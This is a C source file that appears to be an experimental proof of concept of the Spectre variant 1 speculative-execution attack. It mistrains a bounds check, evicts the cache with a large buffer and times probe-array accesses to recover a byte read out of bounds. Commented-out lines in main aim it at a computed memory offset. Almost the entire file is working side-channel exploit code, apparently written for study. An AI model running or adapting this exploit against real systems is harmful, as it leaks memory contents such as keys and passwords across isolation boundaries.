#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctime>

#define CACHE_FLUSH_ITERATIONS 4096
#define CACHE_FLUSH_STRIDE 4096
#define CACHE_LINE 1024
#define NLOOPS 5
char eviction[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
unsigned char array1[256];
int space1[CACHE_LINE];
int array2[256 * CACHE_LINE];
int space2[CACHE_LINE];
int junk_space[256 * CACHE_LINE];
unsigned long long args[2 * 512];
char tmp = 0;
unsigned int array1_size = 255u;
/*
void gadget(unsigned long long index, int *addr){
    int junk;
    if(index < 255u){
        //junk = array2[*(array1+index) * CACHE_LINE];
        junk = addr[*(array1+index) * CACHE_LINE];
    }
}
*/
int global_i, global_junk;
unsigned long long dymmy[20 * 512];
void gadget(){
    unsigned long long index;
    for(global_i = CACHE_FLUSH_ITERATIONS-1;global_i >= 0 ; global_i-=1){
        global_junk = eviction[global_i * CACHE_FLUSH_STRIDE];
    }
    index = dymmy[0];
    index = dymmy[1];
    index = dymmy[2];
    index = dymmy[3];
    index = dymmy[4];
    index = dymmy[5];
    index = dymmy[6];
    index = dymmy[7];
    index = dymmy[8];
    index = dymmy[9];
    if(args[0] < 255u){
        global_junk = array2[*(array1+args[0]) * CACHE_LINE];
        //junk = addr[*(array1+index) * CACHE_LINE];
        while(args[0] >= 255u){}
    }
    index = dymmy[10];
    index = dymmy[11];
    index = dymmy[12];
    index = dymmy[13];
    index = dymmy[14];
    index = dymmy[15];
    index = dymmy[16];
    index = dymmy[17];
    index = dymmy[18];
    index = dymmy[19];
    if(args[512] < 255u){
        global_junk = array2[*(array1+args[512]) * CACHE_LINE];
        while(args[512] >= 255u){}
    }
}

void myflush(){
    int i, junk;
    for(i = CACHE_FLUSH_ITERATIONS-1;i >= 0 ; i-=1){
        junk = eviction[i * CACHE_FLUSH_STRIDE];
    }
}

void training(unsigned long long index){
    int mix_i;
    for(int j = 0;j < 6;j++){
        for(int i = 0;i < 5;i++){
            mix_i = (((int)tmp++ * 167) + 13) & 255;
            //myflush();
            args[0] = mix_i;
            args[512] = mix_i;
            gadget();
            //gadget(mix_i, junk_space);
        }
        //myflush();
        args[0] = index;
        args[512] = index;
        gadget();
        //gadget(index, array2);
    }
}

void spectre(unsigned long long index){
    int i, j, junk, mix_i, min;
    int *addr;
    clock_t start, end;
    clock_t result[256] = {0};
    for (j = 0;j < NLOOPS;j++){
        //junk = array2[53 * CACHE_FLUSH_STRIDE];
        usleep(3000);
        training(index);
        for(i = 0;i < 256;i++){
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * CACHE_LINE];

            start = clock();
            junk = *addr;
            end = clock();
            result[mix_i] += end - start;
            /*
            if(mix_i == 253){
                printf("start: %lld\nend: %lld\n", start, end);
            }
            */
        }
        /*
        puts("\nShow results.");
        for(i = 0;i < 256;i++){
            printf("index %d: %lld.\n", i, result[i]);
            result[i] = 0;
        }
        */
    }
    puts("Show results.");
    min = 0;
    for(i = 0;i < 256;i++){
        printf("index %d: %lld.\n", i, result[i]);
        if(result[min] >= result[i])min = i;
    }
    puts("");
    printf("minimal index: %d : %c\n", min, min);

}



int main(void){
    int junk;
    space1[0] = 53;
    space2[0] = 0;
    eviction[0] = 0;
    for(int i = 0;i < 256;i++)array1[i] = i;
    for(int i = 0;i < 256;i++)junk = array2[i * CACHE_LINE];
    usleep(3000);
    spectre(255);
    //spectre();
    //unsigned long long offset = (unsigned long long)(0x007fffffffd9a0uL - 0x7ffe6c000e80uL);
    //printf("target offset = 0x%llx\n", offset);
    //spectre(offset);
    //spectre(offset+1);
    //spectre(offset+2);
    //spectre(offset+3);
    //spectre(offset+4);
    return 0;
}
